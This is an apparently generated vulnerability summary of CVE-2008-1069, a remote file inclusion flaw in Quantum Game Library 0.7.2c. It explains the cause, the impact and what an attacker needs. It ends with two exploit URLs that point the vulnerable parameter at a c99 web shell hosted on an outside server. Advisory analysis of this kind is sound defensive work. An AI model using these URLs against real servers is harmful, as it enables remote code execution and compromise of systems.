Based on the provided content, here's a breakdown of the vulnerability information:

**CVE ID:** CVE-2008-1069

**Root Cause of Vulnerability:**
- The vulnerability is due to a lack of proper input sanitization of the `CONFIG['gameroot']` parameter in `server_request.php` and `smarty.inc.php` files. These files use `require_once()` with the unsanitized parameter.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The application includes remote files specified via the `CONFIG['gameroot']` parameter, which is not sanitized, allowing remote code execution.

**Impact of Exploitation:**
- **Remote Code Execution:** An attacker can inject malicious code into the application by including a remote file containing malicious PHP code. This grants the attacker the ability to execute arbitrary code on the server, potentially leading to complete system compromise.

**Attack Vectors:**
- **HTTP GET request:** The vulnerability can be exploited by sending a specially crafted HTTP GET request to the vulnerable scripts (`server_request.php` and `smarty.inc.php`) with the `CONFIG['gameroot']` parameter containing the URL to a malicious PHP file.

**Required Attacker Capabilities/Position:**
- The attacker needs to be able to send HTTP requests to the vulnerable server, they do not require any local access.
- The attacker needs to have a server where they can host a malicious PHP file.

**Additional Details:**
- The vulnerable software is "Quantum Game Library 0.7.2c"
- The vulnerable files are `server_request.php` and `smarty.inc.php`.
- The vulnerability is present on line 2 of `server_request.php` and line 1 of `smarty.inc.php`.
- Example exploit URLs are provided, demonstrating how to inject remote code:
    - `http://www.4rxh.com/qsgen_0.7.2c/server_request.php?CONFIG[gameroot]=http://rxh.freehostia.com/shells/c99in.txt?`
    - `http://www.4rxh.com/qsgen_0.7.2c/qlib/smarty.inc.php?CONFIG[gameroot]=http://rxh.freehostia.com/shells/c99in.txt?`
